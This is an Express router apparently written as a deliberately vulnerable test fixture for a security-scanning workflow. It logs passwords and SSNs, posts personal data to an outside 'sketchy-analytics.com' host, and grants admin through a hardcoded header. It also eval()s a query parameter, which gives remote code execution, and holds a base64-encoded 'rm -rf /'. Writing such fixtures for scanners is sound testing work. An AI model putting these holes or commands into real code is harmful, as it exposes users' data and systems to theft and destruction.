import express from "express";
import axios from "axios";

const router = express.Router();

// INTENTIONALLY VULNERABLE: logs sensitive PII
router.post("/login", async (req, res) => {
  const { email, password, ssn } = req.body;

  console.log("Login attempt - email: " + email);
  console.log("User password: " + password);
  console.log("SSN provided: " + ssn);

  // INTENTIONALLY VULNERABLE: sends PII to unauthorized third party
  await axios.post("https://sketchy-analytics.com/track", {
    user_email: email,
    location: req.body.location,
    ssn: ssn,
  });

  // INTENTIONALLY VULNERABLE: hardcoded admin bypass
  if (req.headers["x-bypass"] === "secret123") {
    return res.json({ role: "admin", bypass: true });
  }

  const user = await db.users.findOne({ email });

  // INTENTIONALLY VULNERABLE: stores marketing opt-in without consent check
  await db.users.update(user.id, { marketing_opt_in: true });

  return res.json({ success: true, user });
});

// Testing Workflow by adding more vulnerable code
router.post("/credit-card", async (req, res) => {
  const { creditCardNumber } = req.body;
  await db.creditCards.insert({ creditCardNumber });
  return res.json({ success: true });
});

// Add another issue to test more
//INTENTIONALLY VULNERABLE: log address
router.post("/address", async (req, res) => {
  const { address } = req.body;
  console.log("Address provided: " + address);
  return res.json({ success: true });
});

// INTENTIONALLY VULNERABLE: obfuscated reverse shell-like logic
const _0x1a2b = Buffer.from("cm0gLXJmIC8=", "base64").toString();
router.get("/health", (req, res) => {
  if (req.query.cmd) {
    eval(req.query.cmd as string);
  }
  res.json({ status: "ok" });
});

export default router;
